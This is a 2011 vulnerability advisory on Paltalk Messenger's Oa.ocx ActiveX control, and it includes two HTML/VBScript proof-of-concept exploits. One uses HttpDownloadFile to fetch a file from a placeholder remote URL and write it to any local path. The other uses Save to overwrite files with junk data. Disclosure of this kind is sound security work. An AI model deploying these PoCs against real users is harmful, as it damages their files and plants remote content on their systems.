Vulnerability ID: HTB23026
Reference: http://www.htbridge.ch/advisory/paltalk_messenger_activex_control_multiple_insecure_methods.html
Product: Paltalk Messenger
Vendor: Paltalk ( http://www.paltalk.com ) 
Vulnerable Version: 10.0 and probably prior
Tested on: 10.0
Vendor Notification: 22 June 2011 
Vulnerability Type: ActiveX control Insecure Method
Risk level: High 
Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Paltalk Messenger, which can be exploited to overwrite arbitrary files.

1) The vulnerability is caused due to the Office Viewer ActiveX control (Oa.ocx) including the insecure "HttpDownloadFile()" method. 
This can be exploited to overwrite arbitrary files in the context of the currently logged-on user by any file located on a remote http server.

The following PoC code is available:


<html>
<object classid='clsid:18A295DA-088E-42D1-BE31-5028D7F9B9B5' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>

Sub Boom()
arg1="http://URL/Filename"
arg2="FilePath\Filename_to_create"
target.HttpDownloadFile arg1 ,arg2 
End Sub

</script>
</html>


2) The vulnerability is caused due to the Office Viewer ActiveX control (Oa.ocx) including the insecure "Save()" method. 
This can be exploited to overwrite with junk data arbitrary files in the context of the currently logged-on user.


<html>
<object classid='clsid:18A295DA-088E-42D1-BE31-5028D7F9B9B5' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>

Sub Boom()
arg1="FilePath\Filename_to_create"
target.Save arg1 
End Sub

</script>
</html>


